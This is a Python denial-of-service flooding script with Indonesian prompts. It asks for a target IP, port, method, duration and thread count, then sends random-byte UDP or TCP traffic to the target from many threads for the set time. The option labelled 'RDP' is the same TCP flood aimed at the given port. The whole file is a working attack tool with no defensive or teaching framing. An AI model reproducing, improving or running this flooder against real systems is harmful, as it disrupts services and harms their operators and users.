import socket
import threading
import random
import time
import sys

target_ip = input("IP Target: ")
target_port = int(input("Port Target: "))
method = input("Metode (UDP/TCP/RDP): ").strip().upper()
duration = int(input("Durasi (detik): "))
threads = int(input("Jumlah Threads: "))

timeout = time.time() + duration

def udp_flood():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while time.time() < timeout:
        try:
            client.sendto(data, (target_ip, target_port))
        except:
            pass

def tcp_flood():
    data = random._urandom(2048)
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(data)
            s.close()
        except:
            pass

def rdp_flood():
    # Sama seperti TCP, karena RDP = TCP port 3389
    data = random._urandom(4096)
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(data)
            s.close()
        except:
            pass

# PILIH METODE
if method == "UDP":
    attack_func = udp_flood
elif method == "TCP":
    attack_func = tcp_flood
elif method == "RDP":
    attack_func = rdp_flood
else:
    print("Metode salah! Gunakan UDP, TCP, atau RDP.")
    sys.exit()

# START THREADS
print(f"\nMenyerang {target_ip}:{target_port} pakai {method} selama {duration} detik...\n")
for i in range(threads):
    t = threading.Thread(target=attack_func)
    t.daemon = True
    t.start()

while time.time() < timeout:
    time.sleep(1)

print("\n✅ Selesai.")